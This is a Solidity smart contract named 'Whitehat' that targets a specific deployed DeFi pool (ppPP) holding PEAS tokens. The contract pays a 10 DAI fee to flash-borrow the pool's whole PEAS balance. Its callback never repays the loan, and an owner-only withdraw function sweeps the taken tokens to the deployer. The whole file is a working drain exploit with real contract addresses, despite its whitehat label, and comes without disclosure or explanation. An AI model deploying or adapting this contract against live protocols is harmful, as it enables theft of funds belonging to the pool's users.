// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IFlashLoanRecipient {
  function callback(bytes calldata data) external;
}

interface IFlashlaonSender {
  function flash(
    address _recipient,
    address _token,
    uint256 _amount,
    bytes calldata _data
  ) external;
  function bond(address _token, uint256 _amount) external;
  function debond(
    uint256 _amount,
    address[] memory,
    uint8[] memory
  ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);
}


contract Whitehat is IFlashLoanRecipient {

    address public ppPP = 0xdbB20A979a92ccCcE15229e41c9B082D5b5d7E31;
    address public DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public PEAS = 0x02f92800F57BCD74066F5709F1Daa1A4302Df875;
    address public owner;

    constructor () {
      owner = msg.sender;
    }

    function cap(uint _peasBalanceOfppPP) public {
      IERC20(DAI).transferFrom(msg.sender, address(this), 10 * 10 ** 18);
      IERC20(DAI).approve(ppPP, 10 * 10 ** 18);

      // uint peasBalanceOfppPP = IERC20(PEAS).balanceOf(ppPP);
      uint peasBalanceOfppPP = _peasBalanceOfppPP;

      IFlashlaonSender(ppPP).flash(address(this), PEAS, peasBalanceOfppPP, "");
    }


    function callback(bytes calldata data) external {

      IERC20(DAI).transferFrom(owner, address(this), 10 * 10 ** 18);
      IERC20(DAI).transfer(owner, 10 * 10 ** 18);

      // uint thisPeasBalance = IERC20(PEAS).balanceOf(address(this));
      // IFlashlaonSender(ppPP).bond(PEAS, thisPeasBalance);

    }

    function withdraw(address token) public {
      require(msg.sender == owner);
      uint balance = IERC20(token).balanceOf(address(this));
      IERC20(token).transfer(owner, balance);
    }
}
